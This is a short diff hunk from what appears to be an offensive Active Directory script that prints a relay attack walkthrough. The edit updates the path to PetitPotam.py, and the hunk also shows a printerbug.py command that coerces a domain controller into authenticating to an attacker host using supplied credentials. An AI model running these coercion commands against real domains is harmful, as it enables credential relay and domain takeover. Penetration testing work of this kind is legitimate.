@@ -201,7 +201,7 @@ def run():
     --shadow-target '{target}'
 
   {Y}Terminal 2 — Trigger coercion:{RST}
-  python3 PetitPotam.py {attacker} {dc}
+  python3 tools/PetitPotam/PetitPotam.py {attacker} {dc}
   # or
   python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {attacker}
 
